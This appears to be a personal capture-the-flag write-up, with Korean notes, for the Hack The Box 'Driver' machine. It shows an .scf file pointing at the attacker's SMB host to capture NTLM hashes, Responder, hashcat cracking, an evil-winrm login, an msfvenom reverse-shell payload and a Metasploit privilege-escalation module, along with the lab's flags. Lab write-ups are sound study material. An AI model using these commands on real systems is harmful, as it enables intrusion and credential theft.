@@ -1,0 +1,188 @@
+ROOM: Driver
+TARGET: 10.129.95.238 
+
+
+
+
+
+
+
+
+Task 1
+
+We're prompted for log on credentials when accessing the target over HTTP. What username is disclosed when looking at the HTTP response headers?
+
+burpswift로 응답 확인
+WWW-Authenticate: Basic realm="MFP Firmware Update Center. Please enter password for admin"
+
+>admin
+
+
+
+
+Task 2
+
+Weak passwords are all too common and this target is no exception. What is the password for this target's login?
+
+>admin
+
+
+Task 3
+
+There are several kinds of files that are commonly dropped into a file share to target other users who may browse to the share. If the user browses to the share, their host will try to authenticate to the attacker. What is the file extension that can be uploaded here to trigger that connection?
+
+
+
+>scf
+
+
+https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
+
+공격자는 공유 폴더에 .scf 파일을 업로드
+
+사용자가 탐색기로 해당 폴더를 열기만 해도
+
+Windows는 .scf 파일 내 아이콘 정보를 자동으로 해석하려 함
+
+아이콘 경로가 \\attacker\share\icon.ico 같은 외부 SMB 경로면
+
+→ Windows는 자동으로 SMB 연결 + NTLM 인증 시도
+
+Task 4
+
+We've intercepted an Net-NTLMv2 hash with Responder. What is the mode in Hashcat required to crack this hash format?
+
+exploit.scf         작성
+[Shell]
+Command=2
+IconFile=\\10.10.14.84\share\icon.ico
+[Taskbar]
+Command=ToggleDesktop
+
+
+sudo responder -I tun0
+responder 실행
+exploit.scf를 타겟 서버에 업로드
+tony::DRIVER:bad9bd924dc9ad63:9F168F...
+tony의 ntlm 해시획득
+https://hashcat.net/wiki/doku.php?id=example_hashes
+에서 해시 코드 확인 5600
+
+
+
+>5600
+
+
+
+
+Task 5
+
+What is the tony user's password?
+hashcat으로 디코딩
+hashcat -m 5600 -a 0 tony.txt  /usr/share/wordlists/rockyou.txt
+
+liltony
+
+
+> liltony
+
+Submit User Flag
+
+Submit the flag located on the tony user's desktop.
+
+5985/tcp	WinRM (HTTP)	PowerShell 원격 접속 (evil-winrm 대상!)
+
+evil-winrm -i 10.129.95.238 -u tony -p liltony
+
+type user.txt
+26b5081e35e8fd5708c582e8eff43525
+
+
+
+>26b5081e35e8fd5708c582e8eff43525
+
+Task 7
+
+What is the filename that stores the command history for PowerShell for tony?
+
+> ConsoleHost_history.txt
+
+
+Task 8
+
+Looking at the Powershell history we can see some actions being performed with a specific printer type. Research of this should show that it's exploitable for privilege escalation and a module is available for the Metasploit framework. What is the module name?
+
+Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'
+
+ping 1.1.1.1
+ping 1.1.1.1
+
+
+
+msfconsole
+search RICHO
+1  exploit/windows/local/ricoh_driver_privesc 
+
+> ricoh_driver_privesc 
+
+
+
+Task 9
+
+
+Initial attempts to exploit this vulnerability may fail under specific logon types such as non-interactive, but in this scenario we can switch to an interactive logon. What command can be used in Metasploit to switch to an interactive logon process?
+
+
+>migrate
+
+Task 10
+
+In addtion to the 'RICOH PCL6 UniversalDriver V4.23' vulnerabiltiy, this target is also vulnerable to CVE-2021-1675 aka PrintNightmare. Is it possible to elevate to SYSTEM privileges with this CVE?
+
+> yes
+
+
+Submit the flag located on the administrator's desktop.
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.84 LPORT=4444 -f exe > shell.exe
+msfvenom으로 kali에서 window에서 kali로 접속 페이로드 생성
+
+upload shell.exe C:\Users\tony\music\shell.exe
+페이로드 생성한거 다운
+
+
+use exploit/multi/handler
+
+ set payload windows/x64/meterpreter/reverse_tcp
+
+set lhost tun0
+
+run
+핸들러로 수신준비
+
+
+./shell.exe
+실행
+
+meterpreter 셸 받아옴
+
+ps 
+ 4636  648   explorer.exe               x64   1        DRIVER\tony  C:\Windows\explorer.exe
+
+migrate 4636
+
+
+use exploit/windows/local/ricoh_driver_privesc
+ set payload windows/x64/meterpreter/reverse_tcp
+ set session 1
+ set lhost tun0
+ run
+
+
+
+>8d7c2cb1f203d204c6c00d0688689481
+
+
+
+
+
